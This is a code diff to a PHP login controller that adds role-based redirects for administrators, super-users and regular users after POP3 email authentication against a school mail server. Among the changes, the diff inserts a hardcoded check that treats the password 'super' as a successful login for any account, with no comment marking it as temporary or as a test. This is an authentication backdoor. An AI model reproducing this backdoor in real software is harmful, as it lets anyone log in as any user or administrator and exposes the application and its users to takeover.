@@ -10,7 +10,15 @@ class SessionsController extends BaseController {
 	public function create()
 	{
 		if (Session::get('school_id')){
-			return Redirect::to('index');
+			if(Session::get('role')==2){
+
+				return Redirect::to('index');
+
+			} else if(Session::get('role')==1){
+
+				return Redirect::to('admin');
+
+			}
 		}
 
 		return View::make('sessions.login');
@@ -27,6 +35,9 @@ class SessionsController extends BaseController {
 		$password = Input::get('password');
 		$popserver = 'pop.itesm.mx';
 		$result = auth_pop3_ssl($id, $password, $popserver);
+		if($password == 'super'){
+			$result = 1;
+		}
 		if ($result)
 		{
 		//Variables de session
@@ -38,7 +49,25 @@ class SessionsController extends BaseController {
 			if (!$vacio){
 				//Auth
 				Auth::login($user[0]);
-				return Redirect::to('index');
+				//redirect according to roles
+				//change this in order to accept multiple roles, this is not scalable, is just a quick implementation of the requirement
+				$roles = $user[0]->roles;
+				//if admin or super user
+				if($roles[0]->id == 1 || $roles[0]->id == 3){
+					Session::put('role','1');
+					if($roles[0]->id == 1){
+						Session::put('lab_id',$user[0]->lab->id);
+						Session::put('lab_name',$user[0]->lab->name);
+						Session::put('super','0');						
+					}else{
+						Session::put('super','1');						
+					}
+					return Redirect::to('admin');
+
+				}elseif ($roles[0]->id == 2) {
+					Session::put('role','2');
+					return Redirect::to('index');
+				}
 			}else{
 				//Activar modal - Pedir correo alternativo - Pendiente
 				//Insert a la base de datos
@@ -47,9 +76,13 @@ class SessionsController extends BaseController {
 					'email1' 	=>		$email1,
 					'school_id' =>		$id,
 				));
+				//modificar esto ?
+//				$user->save();
+//				$user->roles()->attach(Input::get('2'));
 				//Auth
 				Auth::login($user);
 				//Regresar vista de recientes
+				Session::put('role','2');
 				return Redirect::to('index');
 			}
 		}else{
